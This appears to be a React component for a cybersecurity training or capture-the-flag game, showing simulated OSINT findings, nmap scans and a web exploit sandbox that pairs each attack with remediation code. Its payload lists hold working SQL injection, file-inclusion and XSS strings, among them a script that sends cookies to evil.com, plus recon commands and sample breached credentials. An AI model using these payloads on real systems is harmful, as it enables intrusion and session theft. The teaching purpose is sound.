import { useState } from 'react';
import { Globe, Search, Shield, Bug, Database, Eye, Cloud, Lock, Zap, Terminal, Wrench } from 'lucide-react';
import { sfx } from '@/utils/soundEngine';
import { Toggle } from '@/components/ui/Modal';
import { CTF_FLAGS } from '@/utils/ctf';

interface OSINTResult {
  type: string;
  data: string;
  risk: 'low' | 'medium' | 'high' | 'critical';
}

const OSINT_DATA: Record<string, OSINTResult[]> = {
  shodan: [
    { type: 'Open Port', data: '10.10.10.5:22 SSH OpenSSH 8.2p1', risk: 'medium' },
    { type: 'Open Port', data: '10.10.10.5:80 Apache 2.4.41', risk: 'high' },
    { type: 'Open Port', data: '10.10.10.5:445 SMB Samba 4.3.9-Ubuntu', risk: 'high' },
    { type: 'Open Port', data: '10.10.10.5:161 SNMP Community: public', risk: 'critical' },
    { type: 'Banner', data: 'Server: Apache/2.4.41 (Ubuntu) PHP/7.4.3', risk: 'medium' },
  ],
  emails: [
    { type: 'Email', data: 'admin@targetcorp.com (LinkedIn)', risk: 'medium' },
    { type: 'Email', data: 'j.smith@targetcorp.com (Hunter.io)', risk: 'low' },
    { type: 'Email', data: 'it-support@targetcorp.com (GitHub commits)', risk: 'medium' },
    { type: 'Pattern', data: '{first}.{last}@targetcorp.com', risk: 'low' },
  ],
  subdomains: [
    { type: 'Subdomain', data: 'api.targetcorp.com -> 10.10.10.8', risk: 'high' },
    { type: 'Subdomain', data: 'dev.targetcorp.com -> 10.10.10.12', risk: 'critical' },
    { type: 'Subdomain', data: 'staging.targetcorp.com -> 10.10.10.15', risk: 'high' },
    { type: 'Subdomain', data: 'vpn.targetcorp.com -> 10.10.10.3', risk: 'medium' },
    { type: 'Subdomain', data: 'jenkins.targetcorp.com -> 10.10.10.20', risk: 'critical' },
  ],
  dorks: [
    { type: 'Google Dork', data: 'site:targetcorp.com filetype:pdf "confidential"', risk: 'high' },
    { type: 'Google Dork', data: 'site:targetcorp.com inurl:admin', risk: 'critical' },
    { type: 'Google Dork', data: 'site:targetcorp.com filetype:env', risk: 'critical' },
    { type: 'Google Dork', data: 'site:targetcorp.com intitle:"index of"', risk: 'high' },
  ],
  breach: [
    { type: 'Credential', data: 'admin@targetcorp.com:Summer2023! (HaveIBeenPwned)', risk: 'critical' },
    { type: 'Credential', data: 'j.smith@targetcorp.com:Password123 (Collection #1)', risk: 'critical' },
    { type: 'Credential', data: 'it-support@targetcorp.com:P@ssw0rd (RockYou2024)', risk: 'critical' },
  ],
};

const NMAP_PORTS = [
  { port: 22, protocol: 'tcp', service: 'OpenSSH 8.2p1', state: 'open', risk: 'medium' },
  { port: 80, protocol: 'tcp', service: 'Apache httpd 2.4.41', state: 'open', risk: 'high' },
  { port: 161, protocol: 'udp', service: 'SNMPv2c (public)', state: 'open', risk: 'critical' },
  { port: 389, protocol: 'tcp', service: 'LDAP', state: 'open', risk: 'high' },
  { port: 445, protocol: 'tcp', service: 'SMB Samba 4.3.9', state: 'open', risk: 'high' },
  { port: 2049, protocol: 'tcp', service: 'NFS v4', state: 'open', risk: 'high' },
  { port: 3306, protocol: 'tcp', service: 'MySQL 8.0.27', state: 'open', risk: 'critical' },
  { port: 8080, protocol: 'tcp', service: 'Jenkins 2.289.1', state: 'open', risk: 'critical' },
];

const WEB_EXPLOITS = [
  {
    id: 'sqli',
    name: 'SQL Injection',
    icon: Database,
    payloads: [
      "' OR 1=1 --",
      "' UNION SELECT username,password,3 FROM users-- -",
      "' AND IF(1=1,SLEEP(5),0)-- -",
    ],
    fix: 'Use prepared statements with parameterized queries. Never concatenate user input into SQL strings.',
    fixCode: 'stmt = db.prepare("SELECT * FROM users WHERE id = ?");\nstmt.bind(id);\nstmt.execute();',
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    icon: Bug,
    payloads: [
      '<script>fetch("https://evil.com/?c="+document.cookie)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(document.domain)>',
    ],
    fix: 'Output encode all user input. Deploy strict Content-Security-Policy header.',
    fixCode: "Content-Security-Policy: default-src 'self'; script-src 'self'\nres.set('Content-Security-Policy', csp)",
  },
  {
    id: 'lfi',
    name: 'Local File Inclusion (LFI)',
    icon: Eye,
    payloads: [
      '../../../../etc/passwd',
      '../../../../var/log/apache2/access.log',
      'php://filter/convert.base64-encode/resource=index.php',
    ],
    fix: 'Validate and sanitize file paths. Use an allowlist of permitted files. Disable PHP wrappers.',
    fixCode: 'const allowed = ["file1.txt", "file2.txt"];\nif (!allowed.includes(req.params.file))\n  return res.status(403).send("Forbidden");',
  },
  {
    id: 'session',
    name: 'Session Hijacking',
    icon: Lock,
    payloads: [
      'JWT: eyJhbGc...{alg:none} (Algorithm confusion)',
      'Cookie: SESSIONID=abc123 (Predictable session ID)',
      'TCP SEQ prediction: 2893284 -> 2893285',
    ],
    fix: 'Use strong random session IDs. Set HttpOnly, Secure, SameSite cookies. Validate JWT algorithm.',
    fixCode: 'sessionID = crypto.randomBytes(32).toString("hex");\nres.cookie("SESSIONID", sessionID, {\n  httpOnly: true, secure: true,\n  sameSite: "strict", maxAge: 3600000\n});',
  },
  {
    id: 'evasion',
    name: 'IDS/WAF Evasion',
    icon: Zap,
    payloads: [
      'Fragmented: /*!50000UNION*/ /*!50000SELECT*/',
      'DNS Tunneling: base32(data).evil.com',
      'ICMP Covert: ping payload with shellcode',
    ],
    fix: 'Deploy Deep Packet Inspection (DPI). Reassemble fragments before inspection. Monitor DNS query lengths.',
    fixCode: 'waf.addRule("fragmented_sql", /\\/\\*!\\d+.*\\*\\//);\ndnsMonitor.alert(query.length > 50);\nicmpInspector.checkPayload(ping);',
  },
];

export function OSINTWorkspace({ onCaptureFlag }: { onCaptureFlag?: (flagId: string) => void }) {
  const [osintTab, setOsintTab] = useState('shodan');
  const [nmapRun, setNmapRun] = useState(false);
  const [shroudActive, setShroudActive] = useState(false);
  const [exploitTab, setExploitTab] = useState('sqli');
  const [patchedExploits, setPatchedExploits] = useState<Set<string>>(new Set());

  const osintTabs = [
    { id: 'shodan', label: 'Shodan/Censys', icon: Globe },
    { id: 'emails', label: 'Email Harvest', icon: Search },
    { id: 'subdomains', label: 'Subdomains', icon: Cloud },
    { id: 'dorks', label: 'Google Dorks', icon: Search },
    { id: 'breach', label: 'Breach Creds', icon: Lock },
  ];

  const currentExploit = WEB_EXPLOITS.find((e) => e.id === exploitTab)!;
  const isPatched = patchedExploits.has(exploitTab);

  const riskColor = (risk: string) => ({
    critical: 'badge-crimson',
    high: 'badge-crimson',
    medium: 'badge-amber',
    low: 'badge-cyan',
  }[risk] || 'badge-slate');

  const phantomPorts = shroudActive ? Array.from({ length: 65535 }, (_, i) => i + 1).filter((p) => !NMAP_PORTS.some((np) => np.port === p)).slice(0, 20) : [];

  return (
    <div className="flex h-full overflow-auto p-2 gap-2">
      {/* Left: OSINT Hub */}
      <div className="flex-1 panel flex flex-col overflow-hidden min-w-0">
        <div className="panel-header">
          <Globe size={12} className="text-cyan-400" />
          OSINT & Breach Correlation Hub
        </div>
        <div className="flex items-center gap-1 p-2 border-b border-obsidian-700 overflow-x-auto">
          {osintTabs.map((t) => {
            const Icon = t.icon;
            return (
              <button
                key={t.id}
                className={`flex items-center gap-1 px-2 py-1 rounded text-[10px] font-semibold transition-all whitespace-nowrap ${
                  osintTab === t.id ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30' : 'text-slate-500 hover:text-slate-300 border border-transparent'
                }`}
                onClick={() => { setOsintTab(t.id); sfx.tab(); }}
              >
                <Icon size={10} /> {t.label}
              </button>
            );
          })}
        </div>
        <div className="flex-1 overflow-auto p-3 space-y-1.5">
          <div className="text-[10px] text-slate-600 mb-2 font-mono">
            $ theHarvester -d targetcorp.com -b all
          </div>
          {(OSINT_DATA[osintTab] || []).map((result, i) => (
            <div key={i} className="flex items-center gap-2 p-2 rounded-md bg-obsidian-800 border border-obsidian-700 hover:border-obsidian-600 transition-all">
              <span className={riskColor(result.risk)}>{result.risk}</span>
              <span className="text-[10px] text-slate-500 font-mono w-20 shrink-0">{result.type}</span>
              <span className="text-xs text-slate-300 font-mono truncate">{result.data}</span>
            </div>
          ))}
          <div className="pt-2 mt-2 border-t border-obsidian-700">
            <div className="text-[10px] text-slate-600 mb-1">Burp Intruder: Pitchfork vs Cluster Bomb</div>
            <div className="flex gap-2">
              <div className="panel p-2 flex-1">
                <div className="text-[10px] text-cyan-400 font-bold">Pitchfork (Parallel)</div>
                <div className="text-[9px] text-slate-500 mt-1">1 payload per position, synchronized iteration. Best for known credential pairs.</div>
              </div>
              <div className="panel p-2 flex-1">
                <div className="text-[10px] text-amber-400 font-bold">Cluster Bomb (Cartesian)</div>
                <div className="text-[9px] text-slate-500 mt-1">All payload combinations. Best for unknown credential discovery.</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Center: Nmap + Port Shrouding */}
      <div className="flex-1 panel flex flex-col overflow-hidden min-w-0">
        <div className="panel-header">
          <Terminal size={12} className="text-cyan-400" />
          Nmap Scanner & Port Shrouding (shroud.c)
        </div>
        <div className="flex-1 overflow-auto p-3 space-y-3">
          <div className="flex items-center gap-2">
            <button
              className="btn-cyan flex items-center gap-1"
              onClick={() => { setNmapRun(true); sfx.radar(); }}
            >
              <Search size={12} /> Run nmap -sS -O -A
            </button>
            <div className="flex items-center gap-2 ml-auto">
              <span className="text-[10px] text-slate-500">Port Shroud</span>
              <Toggle on={shroudActive} onChange={(v) => { setShroudActive(v); sfx.shield(); }} colorOn="bg-amber-500" />
              <span className="text-[10px] text-amber-400">shroud.c</span>
            </div>
          </div>

          <div className="terminal p-3">
            <div className="text-[10px] text-slate-600 mb-2">
              $ nmap -sS -O -A -p- 10.10.10.5
            </div>
            {!nmapRun ? (
              <div className="text-[10px] text-slate-600 py-4 text-center">Click "Run nmap" to scan target</div>
            ) : (
              <>
                <div className="text-[10px] text-emerald-400 mb-2">Starting Nmap 7.94 ( https://nmap.org )</div>
                <table className="w-full text-[10px] font-mono">
                  <thead>
                    <tr className="text-slate-600 border-b border-obsidian-700">
                      <th className="text-left py-1">PORT</th>
                      <th className="text-left">STATE</th>
                      <th className="text-left">SERVICE</th>
                      <th className="text-left">RISK</th>
                    </tr>
                  </thead>
                  <tbody>
                    {NMAP_PORTS.map((p) => (
                      <tr key={p.port} className="border-b border-obsidian-800/50">
                        <td className="py-1 text-cyan-400">{p.port}/{p.protocol}</td>
                        <td className="text-emerald-400">{shroudActive ? 'phantom' : p.state}</td>
                        <td className="text-slate-400">{shroudActive ? '<spoofed>' : p.service}</td>
                        <td>{shroudActive ? <span className="badge-amber">SPOOFED</span> : <span className={riskColor(p.risk)}>{p.risk}</span>}</td>
                      </tr>
                    ))}
                    {shroudActive && phantomPorts.length > 0 && (
                      <>
                        <tr className="text-slate-700"><td colSpan={4} className="pt-2 text-[9px]">... 65,535 phantom ports (FIN/X-mas blind) ...</td></tr>
                        {phantomPorts.slice(0, 5).map((p) => (
                          <tr key={p} className="text-amber-400/30">
                            <td className="py-0.5">{p}/tcp</td>
                            <td>phantom</td>
                            <td>&lt;spoofed&gt;</td>
                            <td><span className="badge-amber">SPOOFED</span></td>
                          </tr>
                        ))}
                      </>
                    )}
                  </tbody>
                </table>
                <div className="mt-2 text-[10px] text-slate-600">
                  {shroudActive
                    ? '⚠ PORT SHROUD ACTIVE: 65,535 phantom open ports reported to FIN/X-mas scans. Attacker blinded.'
                    : 'OS Detection: Linux 5.4 (Ubuntu) | SNMP: Community string "public" (critical!)'}
                </div>
                {shroudActive && (
                  <div className="mt-2 flex items-center justify-between p-2 rounded bg-amber-600/5 border border-amber-600/20">
                    <span className="text-[9px] text-amber-500">CTF: Port Shroud deployed — flag discovered!</span>
                    <button
                      className="text-[9px] font-bold text-amber-500 hover:text-amber-400 transition-colors"
                      onClick={() => { if (onCaptureFlag) onCaptureFlag('flag-shroud'); sfx.flagCapture(); }}
                    >
                      🚩 {CTF_FLAGS.find((f) => f.id === 'flag-shroud')?.flag ?? 'FLAG{GUARDDUELSI_SHROUD_65535}'}
                    </button>
                  </div>
                )}
              </>
            )}
          </div>

          <div className="panel p-3">
            <div className="text-[10px] text-slate-500 uppercase mb-2">Protocol Enumeration</div>
            <div className="space-y-1">
              {[
                { proto: 'SNMP (161)', cmd: 'snmp-check 10.10.10.5 -c public', result: 'System: Linux 5.4.0 | Uptime: 47d | Processes: 142' },
                { proto: 'LDAP (389)', cmd: 'ldapsearch -x -H ldap://10.10.10.5', result: 'dc=targetcorp,dc=com | 47 users | 12 groups' },
                { proto: 'SMB (445)', cmd: 'smbclient -L //10.10.10.5 -N', result: 'Shares: IPC$ | public | HR_Data (READ)' },
                { proto: 'NFS (2049)', cmd: 'showmount -e 10.10.10.5', result: '/home/share *(rw,no_root_squash) — CRITICAL misconfig' },
              ].map((e) => (
                <div key={e.proto} className="flex flex-col p-2 rounded bg-obsidian-800 border border-obsidian-700">
                  <div className="flex items-center gap-2">
                    <span className="badge-cyan">{e.proto}</span>
                    <code className="text-[9px] text-slate-500 font-mono">{e.cmd}</code>
                  </div>
                  <div className="text-[10px] text-slate-400 mt-1 font-mono">{e.result}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Right: Web Exploit Sandbox */}
      <div className="flex-1 panel flex flex-col overflow-hidden min-w-0">
        <div className="panel-header">
          <Wrench size={12} className="text-cyan-400" />
          Web & Agent Backend Exploit Sandbox
        </div>
        <div className="flex items-center gap-1 p-2 border-b border-obsidian-700 overflow-x-auto">
          {WEB_EXPLOITS.map((e) => {
            const Icon = e.icon;
            return (
              <button
                key={e.id}
                className={`flex items-center gap-1 px-2 py-1 rounded text-[10px] font-semibold transition-all whitespace-nowrap ${
                  exploitTab === e.id ? 'bg-crimson-600/10 text-crimson-400 border border-crimson-600/30' : 'text-slate-500 hover:text-slate-300 border border-transparent'
                }`}
                onClick={() => { setExploitTab(e.id); sfx.tab(); }}
              >
                <Icon size={10} /> {e.name.split(' ')[0]}
              </button>
            );
          })}
        </div>
        <div className="flex-1 overflow-auto p-3 space-y-3">
          <div className="text-xs text-slate-300 font-semibold">{currentExploit.name}</div>

          <div>
            <div className="text-[10px] text-crimson-400 uppercase mb-1">Exploit Payloads</div>
            <div className="space-y-1">
              {currentExploit.payloads.map((p, i) => (
                <div key={i} className="terminal p-2 text-[10px] text-crimson-400 font-mono">
                  <span className="text-slate-600">payload&gt; </span>{p}
                </div>
              ))}
            </div>
          </div>

          <div>
            <div className="text-[10px] text-emerald-400 uppercase mb-1">Remediation</div>
            <div className="panel p-2 text-[10px] text-slate-400 border-emerald-600/20">
              {currentExploit.fix}
            </div>
            <div className="terminal p-2 mt-1 text-[10px] text-emerald-400 font-mono whitespace-pre-wrap">
              {currentExploit.fixCode}
            </div>
          </div>

          <button
            className={`w-full ${isPatched ? 'btn-emerald' : 'btn-tactical'} flex items-center justify-center gap-1`}
            onClick={() => {
              setPatchedExploits((prev) => new Set([...prev, exploitTab]));
              sfx.patch();
            }}
          >
            <Shield size={12} />
            {isPatched ? 'Patched & Verified' : 'Apply 1-Click Patch'}
          </button>

          {isPatched && (
            <div className="panel p-2 border-emerald-600/20">
              <div className="text-[10px] text-emerald-400 font-bold">Verification: PASS</div>
              <div className="text-[10px] text-slate-500 mt-1">
                Payloads blocked | WAF rule active | Input validation enforced
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
